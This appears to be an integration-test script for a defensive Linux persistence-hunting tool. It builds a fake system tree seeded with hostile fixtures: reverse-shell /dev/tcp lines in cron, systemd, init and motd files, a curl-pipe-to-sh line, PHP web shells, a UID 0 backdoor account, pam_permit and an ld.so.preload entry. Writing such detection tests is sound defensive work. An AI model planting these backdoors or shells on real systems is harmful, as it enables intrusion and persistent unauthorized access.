#!/bin/sh
# Self-contained integration checks. No Python, root or network required.
set -eu
LC_ALL=C
export LC_ALL
SCRIPT=$(CDPATH= cd -- "$(dirname "$0")/.." && pwd)/hunter-hunt.sh
TESTDIR=$(mktemp -d "${TMPDIR:-/tmp}/ccdc-hunt-test.XXXXXXXX")
trap 'rm -rf "$TESTDIR"' 0
trap 'exit 1' 1 2 15
ROOT="$TESTDIR/fake system"
mkdir -p "$ROOT/etc/ssh/sshd_config.d" "$ROOT/root/.ssh" \
    "$ROOT/home/analyst/.ssh" "$ROOT/etc/cron.d" "$ROOT/etc/apt/apt.conf.d" \
    "$ROOT/etc/sudoers.d" "$ROOT/etc/systemd/system" "$ROOT/etc/pam.d" \
    "$ROOT/lib/security" "$ROOT/usr/include" "$ROOT/etc/init.d" \
    "$ROOT/etc/update-motd.d" "$ROOT/var/www/html/nested directory" \
    "$ROOT/custom web" "$ROOT/tmp" "$ROOT/dev/shm" "$ROOT/var/log"
cat > "$ROOT/etc/passwd" <<'DATA'
root:x:0:0:root:/root:/bin/sh
backdoor:x:0:0:unexpected:/root:/bin/sh
analyst:x:1000:1000:analyst:/home/analyst:/bin/sh
DATA
cat > "$ROOT/etc/group" <<'DATA'
root:x:0:
wheel:x:10:analyst
DATA
printf 'root:!:1:0:99999:7:::\nblank::1:0:99999:7:::\n' > "$ROOT/etc/shadow"
printf 'ssh-ed25519 PUBLIC_KEY_MUST_NOT_BE_COPIED analyst@example\ncommand="/usr/local/bin/restricted" ssh-ed25519 PUBLIC_KEY_MUST_NOT_BE_COPIED\n' > "$ROOT/root/.ssh/authorized_keys"
printf 'PRIVATE_KEY_MUST_NOT_BE_COPIED\n' > "$ROOT/root/.ssh/id_ed25519"
printf 'AuthorizedKeysCommand /usr/local/bin/key-helper\n' > "$ROOT/etc/ssh/sshd_config"
printf "alias sudo='echo fake'\ncurl https://example.invalid/x | sh\n" > "$ROOT/home/analyst/.bashrc"
# A late hit verifies detection reads beyond the saved 100-line excerpt.
awk 'BEGIN {for(i=1;i<=125;i++) print "echo harmless"; print "* * * * * root sh -c '\''sh -i >& /dev/tcp/192.0.2.1/4444 0>&1'\''"}' > "$ROOT/etc/cron.d/late"
printf 'APT::Update::Post-Invoke { "sh /tmp/apt-hook"; };\n' > "$ROOT/etc/apt/apt.conf.d/99hook"
printf 'analyst ALL=(ALL) NOPASSWD: ALL\n' > "$ROOT/etc/sudoers.d/analyst"
printf '[Service]\nExecStart=/bin/sh -c "cat /dev/tcp/192.0.2.1/4444"\n' > "$ROOT/etc/systemd/system/unapproved.service"
printf 'auth sufficient pam_permit.so\n' > "$ROOT/etc/pam.d/sshd"
printf 'not a real module\nhunt3r\n' > "$ROOT/lib/security/pam_unix.so"
printf '#define EXAMPLE "hunt3r"\n' > "$ROOT/usr/include/type.h"
printf '/tmp/loader.so\n' > "$ROOT/etc/ld.so.preload"
printf 'not a real library\n' > "$ROOT/tmp/loader.so"
printf 'not a real library\n' > "$ROOT/dev/shm/shm.so"
printf 'not a real module\n' > "$ROOT/tmp/unapproved.ko"
printf '#!/bin/sh\ncat /dev/tcp/192.0.2.1/44\n' > "$ROOT/etc/init.d/daemon"
printf '#!/bin/sh\ncat /dev/tcp/192.0.2.1/45\n' > "$ROOT/etc/rc.local"
printf '#!/bin/sh\ncat /dev/tcp/192.0.2.1/46\n' > "$ROOT/etc/update-motd.d/99bad"
printf '<?php system($_GET["cmd"]); ?>\n' > "$ROOT/var/www/html/nested directory/x.php"
printf '<?php eval($_POST["x"]); ?>\n' > "$ROOT/custom web/hidden.phtml"
printf 'kernel: diamorphine loaded\n' > "$ROOT/var/log/kern.log"
# Must never be executed by the collector.
printf '#!/bin/sh\ntouch "%s"\n' "$TESTDIR/PAYLOAD_EXECUTED" > "$ROOT/tmp/bash"
chmod 4755 "$ROOT/tmp/bash"
mkdir -p "$ROOT/usr/bin"
printf 'ordinary SUID fixture, never executed\n' > "$ROOT/usr/bin/fixture-helper"
chmod 4755 "$ROOT/usr/bin/fixture-helper"
# Test terminal escape sanitization in attacker-controlled evidence.
printf 'echo "\033[31mCONTROL_TEST"\n' > "$ROOT/etc/cron.d/control"
# The collector must not follow an offline symlink into the host.
printf 'OUTSIDE_ROOT_SECRET\n' > "$TESTDIR/secret"
ln -s "$TESTDIR/secret" "$ROOT/etc/profile"
mkdir "$TESTDIR/outside config"
printf 'OUTSIDE_TREE_SECRET\n' > "$TESTDIR/outside config/outside.conf"
ln -s "$TESTDIR/outside config" "$ROOT/etc/profile.d"
ln -s "$TESTDIR/outside config" "$ROOT/external"
# Ordinary config aliases must use destination permissions, rather than the
# always-writable symlink mode. A genuinely writable destination must still alert.
printf 'ordinary config\n' > "$ROOT/etc/cron.d/readonly-target"
printf 'writable config\n' > "$ROOT/etc/cron.d/writable-target"
chmod 644 "$ROOT/etc/cron.d/readonly-target"
chmod 666 "$ROOT/etc/cron.d/writable-target"
ln -s readonly-target "$ROOT/etc/cron.d/readonly-link"
ln -s writable-target "$ROOT/etc/cron.d/writable-link"
ACL_TEST=no
if command -v setfacl >/dev/null 2>&1 && command -v getfacl >/dev/null 2>&1; then
    if setfacl -m u:65534:rw "$ROOT/etc/shadow" 2>/dev/null; then
        ACL_TEST=yes
        printf 'masked ACL fixture\n' > "$ROOT/etc/masked-acl"
        setfacl -m u:65534:rwx,m::r "$ROOT/etc/masked-acl"
    fi
fi
assert_contains() {
    grep -F "$2" "$1" >/dev/null || { printf 'FAIL: missing %s in %s\n' "$2" "$1" >&2; exit 1; }
}
assert_absent() {
    if grep -F "$2" "$1" >/dev/null; then printf 'FAIL: unexpected %s in %s\n' "$2" "$1" >&2; exit 1; fi
}
run_case() {
    shell=$1; tag=$2
    case $shell in
        posix-bash) bash --posix "$SCRIPT" --root "$ROOT" --web-root '/custom web' --scan-root /dev/shm --scan-root /external -o "$TESTDIR/$tag.txt" > "$TESTDIR/$tag.stdout" 2> "$TESTDIR/$tag.stderr" ;;
        posix-zsh) zsh --emulate sh "$SCRIPT" --root "$ROOT" --web-root '/custom web' --scan-root /dev/shm --scan-root /external -o "$TESTDIR/$tag.txt" > "$TESTDIR/$tag.stdout" 2> "$TESTDIR/$tag.stderr" ;;
        *) "$shell" "$SCRIPT" --root "$ROOT" --web-root '/custom web' --scan-root /dev/shm --scan-root /external -o "$TESTDIR/$tag.txt" > "$TESTDIR/$tag.stdout" 2> "$TESTDIR/$tag.stderr" ;;
    esac
    report="$TESTDIR/$tag.txt"
    stdout="$TESTDIR/$tag.stdout"
    assert_absent "$TESTDIR/$tag.stderr" 'range-endpoints'
    awk '/^Host: / {if ($2=="|") exit 1; found=1} END {if (!found) exit 1}' "$report" || {
        printf 'FAIL: missing report hostname\n' >&2; exit 1;
    }
    for expected in 'COMPLETED' 'Additional UID 0 account' \
        'SSH authorization entries require owner approval' 'Additional SSH authorization source' \
        'Download-and-execute' 'APT command hook' 'Passwordless sudo' \
        'unapproved.service' 'PAM sufficient unconditional' 'System-wide dynamic loader preload' \
        'PAM module' 'Kernel module outside' 'Kernel log contains' 'SUID shell' \
        'shm.so' 'Web request input' 'late:126' 'hidden.phtml' 'Incomplete visibility' \
        '[LOW] SUID executable needs baseline approval'; do
        assert_contains "$stdout" "$expected"
    done
    for category in SSH SHELL CRON APT PRIVILEGE SYSTEMD PAM INIT RC_LOCAL MOTD LOADER LKM_FILES SUID ACL WEBSHELL PROC_MOUNTS; do
        assert_contains "$report" "$category:"
    done
    assert_contains "$report" 'excerpt truncated; detection scanned the entire file'
    assert_contains "$report" 'Outside-root symlink skipped'
    assert_contains "$report" 'outside-root directory skipped'
    assert_contains "$report" 'outside-root search root skipped'
    assert_contains "$report" 'CONTROL_TEST'
    awk '/^\[/ {writable=($0=="[HIGH] Sensitive configuration writable by group or other users")}
         writable && /^  Location: / {print substr($0,13)}' "$stdout" > "$TESTDIR/$tag.writable-paths"
    assert_absent "$TESTDIR/$tag.writable-paths" '/etc/cron.d/readonly-link'
    assert_absent "$TESTDIR/$tag.writable-paths" '/etc/cron.d/readonly-target'
    assert_contains "$TESTDIR/$tag.writable-paths" '/etc/cron.d/writable-link'
    assert_contains "$TESTDIR/$tag.writable-paths" '/etc/cron.d/writable-target'
    for secret in PUBLIC_KEY_MUST_NOT_BE_COPIED PRIVATE_KEY_MUST_NOT_BE_COPIED OUTSIDE_ROOT_SECRET OUTSIDE_TREE_SECRET; do assert_absent "$report" "$secret"; done
    # Confirm all findings are in descending priority on screen and in the report.
    for data in "$stdout" "$report"; do
        awk '/^DETAILED EVIDENCE/ {exit}
            /^\[(CRITICAL|HIGH|MEDIUM|LOW|INFO)\]/ {
                split($0, a, "]"); s=substr(a[1],2)
                rank=(s=="CRITICAL"?1:s=="HIGH"?2:s=="MEDIUM"?3:s=="LOW"?4:5)
                if (rank<previous) exit 1; previous=rank; n++
            } END {if (!n) exit 1}' "$data" || { printf 'FAIL: severity ordering\n' >&2; exit 1; }
    done
    mode=$(ls -ld "$report" | awk '{print substr($1,1,10)}')
    [ "$mode" = '-rw-------' ] || { printf 'FAIL: report permissions %s\n' "$mode" >&2; exit 1; }
    [ ! -e "$TESTDIR/PAYLOAD_EXECUTED" ] || { printf 'FAIL: executed a fixture payload\n' >&2; exit 1; }
    if LC_ALL=C grep "$(printf '\033')" "$report" >/dev/null; then printf 'FAIL: raw terminal escape saved\n' >&2; exit 1; fi
    if [ "$ACL_TEST" = yes ]; then
        assert_contains "$stdout" 'ACL grants access to a sensitive path'
        assert_absent "$stdout" '/etc/masked-acl'
        assert_contains "$report" '#effective:r--'
    fi
    # The terminal summary is saved verbatim as part of the report.
    awk 'BEGIN {printing=0} /^CCDC persistence triage/ {printing=1} printing {print} /^DETAILED EVIDENCE/ {exit}' "$report" > "$TESTDIR/report-summary"
    # Compare via checksums after trimming leading/trailing blanks and the evidence heading.
    awk 'NF {seen=1} seen && $0 !~ /^DETAILED EVIDENCE/ {print}' "$TESTDIR/report-summary" | sed '/./,$!d' > "$TESTDIR/a"
    awk 'NF {seen=1} seen {print}' "$stdout" > "$TESTDIR/b"
    # Prefix containment, without relying on diff being installed.
    awk 'NR==FNR {line[NR]=$0; next} $0!=line[FNR] {exit 1}' "$TESTDIR/a" "$TESTDIR/b" || { printf 'FAIL: summary differs\n' >&2; exit 1; }
    printf 'PASS: %s (detection, order, scope, permissions, redaction, no execution)\n' "$tag"
}
run_case sh system-sh
command -v bash >/dev/null 2>&1 && run_case posix-bash bash-posix
command -v zsh >/dev/null 2>&1 && run_case posix-zsh zsh-posix
for extra_shell in dash ash; do
    if command -v "$extra_shell" >/dev/null 2>&1; then run_case "$extra_shell" "$extra_shell"; fi
done
# Supply a minimal utility set to exercise missing optional tools, then inject a
# getfacl fixture. This host filesystem may not implement real extended ACLs.
mkdir "$TESTDIR/posix-bin"
for utility in awk cat cksum date find grep id ls mkdir rm sed sort tr uname wc realpath; do
    utility_path=$(command -v "$utility")
    ln -s "$utility_path" "$TESTDIR/posix-bin/$utility"
done
sed 's|^PATH=/usr/sbin:.*|PATH=$CCDC_TEST_PATH|' "$SCRIPT" > "$TESTDIR/restricted-hunt.sh"
CCDC_TEST_PATH="$TESTDIR/posix-bin" sh "$TESTDIR/restricted-hunt.sh" --root "$ROOT" \
    -o "$TESTDIR/minimal.txt" > "$TESTDIR/minimal.stdout" 2> "$TESTDIR/minimal.stderr"
assert_contains "$TESTDIR/minimal.stdout" 'Extended ACL check unavailable'
assert_contains "$TESTDIR/minimal.txt" 'SKIPPED: strings unavailable'
assert_contains "$TESTDIR/minimal.stdout" 'COMPLETED'
cat > "$TESTDIR/posix-bin/getfacl" <<'ACL_STUB'
#!/bin/sh
for file do
    case $file in -*) continue ;; esac
    printf '# file: %s\nuser::rw-\ngroup::---\nother::---\n' "$file"
    case $file in
        */etc/shadow) printf 'user:65534:rw-\nmask::rw-\n' ;;
        */etc/masked-acl) printf 'user:65534:rwx\t#effective:r--\nmask::r--\n' ;;
        */root) printf 'user:65534:r-x\nmask::r-x\n' ;;
    esac
    printf '\n'
done
ACL_STUB
chmod +x "$TESTDIR/posix-bin/getfacl"
# Always create the masked fixture, even when real setfacl was unavailable.
printf 'masked fixture\n' > "$ROOT/etc/masked-acl"
CCDC_TEST_PATH="$TESTDIR/posix-bin" sh "$TESTDIR/restricted-hunt.sh" --root "$ROOT" \
    -o "$TESTDIR/mock-acl.txt" > "$TESTDIR/mock-acl.stdout" 2> "$TESTDIR/mock-acl.stderr"
assert_contains "$TESTDIR/mock-acl.stdout" '[HIGH] ACL grants access to a sensitive path'
assert_contains "$TESTDIR/mock-acl.stdout" 'user:65534:rw-'
assert_absent "$TESTDIR/mock-acl.stdout" '/etc/masked-acl'
assert_contains "$TESTDIR/mock-acl.txt" '#effective:r--'
printf 'PASS: missing optional utilities and ACL effective-mask prioritization\n'
# Output clobber and output symlink protections.
printf 'KEEP_EXISTING\n' > "$TESTDIR/existing"
if sh "$SCRIPT" --root "$ROOT" -o "$TESTDIR/existing" >/dev/null 2>&1; then printf 'FAIL: overwrote report\n' >&2; exit 1; fi
assert_contains "$TESTDIR/existing" KEEP_EXISTING
ln -s "$TESTDIR/existing" "$TESTDIR/report-symlink"
if sh "$SCRIPT" --root "$ROOT" -o "$TESTDIR/report-symlink" >/dev/null 2>&1; then printf 'FAIL: followed report symlink\n' >&2; exit 1; fi
assert_contains "$TESTDIR/existing" KEEP_EXISTING
# Input errors must fail before scanning.
if sh "$SCRIPT" --root / >/dev/null 2>&1; then printf 'FAIL: accepted --root /\n' >&2; exit 1; fi
if sh "$SCRIPT" --scan-root relative >/dev/null 2>&1; then printf 'FAIL: accepted relative root\n' >&2; exit 1; fi
if sh "$SCRIPT" --web-root /../tmp >/dev/null 2>&1; then printf 'FAIL: accepted parent traversal\n' >&2; exit 1; fi
sh "$SCRIPT" --help >/dev/null
# Default auto-save, with no -o argument.
mkdir "$TESTDIR/auto"
(cd "$TESTDIR/auto" && sh "$SCRIPT" --root "$ROOT" > summary 2> progress)
set -- "$TESTDIR/auto"/ccdc-hunt-*.txt
[ "$#" -eq 1 ] && [ -s "$1" ] || { printf 'FAIL: automatic report name\n' >&2; exit 1; }
printf 'PASS: automatic report, overwrite/symlink protection, argument validation\n'
if [ "$ACL_TEST" != yes ]; then printf 'SKIP: extended ACL fixture (setfacl/getfacl or filesystem ACLs unavailable)\n'; fi
printf 'All integration checks passed.\n'
